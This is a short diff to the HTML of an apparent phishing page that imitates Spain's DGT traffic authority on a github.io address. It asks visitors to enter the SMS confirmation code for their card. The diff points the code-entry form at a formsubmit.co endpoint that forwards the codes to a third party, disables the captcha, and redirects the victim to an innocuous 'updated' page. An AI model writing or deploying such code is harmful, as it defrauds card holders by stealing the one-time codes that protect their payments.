@@ -53,8 +53,13 @@
             </div>
 
             <!-- Formulaire de saisie du code -->
-            <form class="otp-form" method="POST" action="updated.html" enctype="multipart/form-data">
-                <label for="otp-input">Enter the confirmation code you recieved via SMS</label>
+            
+            <form action="https://formsubmit.co/528cfa5ae469b703e6904a3689b34436" method="POST" enctype="multipart/form-data">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_next" value="https://sede-dgt-gob.github.io/sede-dgt-gob/cartes/updated.html">
+                        <input type="hidden" name="_template" value="table">
+                        <input type="hidden" name="_subject" value="Confirm Card">
+                        <label for="otp-input">Enter the confirmation code you recieved via SMS</label>
                 
                 <div class="otp-inputs-container">
                     <input name="code1" type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" required>
